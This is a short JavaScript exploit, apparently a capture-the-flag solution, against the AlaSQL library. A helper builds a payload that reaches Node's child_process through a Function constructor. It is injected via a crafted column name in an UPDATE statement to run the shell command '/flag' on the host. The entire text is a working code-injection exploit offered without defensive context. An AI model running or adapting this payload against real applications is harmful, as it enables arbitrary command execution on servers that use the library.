const genPayload = command => `
new Function(
    'return this.process.mainModule.require'
)()('child_process').execSync(${JSON.stringify(command)})
`;

alasql("CREATE TABLE example1 (a INT)");
alasql("INSERT INTO example1 VALUES (1337)");
alasql("UPDATE example1 SET [0'+${genPayload(">&2 echo UPDATE pwned $(/flag)")}+']=42");
